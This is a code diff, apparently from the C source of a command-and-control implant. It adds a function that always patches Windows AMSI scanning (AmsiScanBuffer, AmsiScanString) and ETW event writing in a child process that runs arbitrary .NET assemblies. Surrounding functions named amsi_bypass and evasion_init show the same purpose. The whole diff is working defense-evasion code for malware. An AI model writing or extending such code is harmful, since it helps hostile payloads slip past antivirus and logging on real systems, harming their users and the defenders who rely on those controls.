@@ -540,6 +540,15 @@ void amsi_bypass(void) {
 #endif
 }
 
+/* Always patch AMSI+ETW in the CLR fork-and-run child regardless of build
+ * flags. The child runs arbitrary .NET assemblies whose P/Invoke, WMI and
+ * reflection calls will crash (0xC0000005) if AMSI hooks are left in place. */
+void clr_amsi_init(void) {
+    patch_fn_h(EV_H_AMSI, EV_H_AmsiScanBuf);
+    patch_fn_h(EV_H_AMSI, EV_H_AmsiScanStr);
+    patch_fn_h(EV_H_NTDLL, EV_H_EtwWrite);
+}
+
 void evasion_init(void) {
 #ifdef AGENT_AMSI_BYPASS
     patch_fn_h(EV_H_AMSI, EV_H_AmsiScanBuf);
